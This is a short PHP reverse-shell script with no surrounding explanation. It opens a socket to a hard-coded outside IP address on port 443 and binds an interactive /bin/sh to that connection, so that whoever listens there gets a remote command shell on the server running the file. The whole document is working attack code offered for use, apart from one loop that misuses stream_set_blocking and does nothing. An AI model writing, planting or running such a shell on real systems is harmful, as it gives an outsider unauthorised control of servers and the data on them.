<?php
$ip = '134.199.168.24';
$port = 443;

$sock = fsockopen($ip, $port);
if ($sock) {
    // Redirect STDOUT, STDERR, STDIN
    foreach(["1" => "stdout", "2" => "stderr", "0" => "stdin"] as $n => $s)
        stream_set_blocking($n, true);

    $proc = proc_open("/bin/sh -i", [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ], $pipes);
}
?>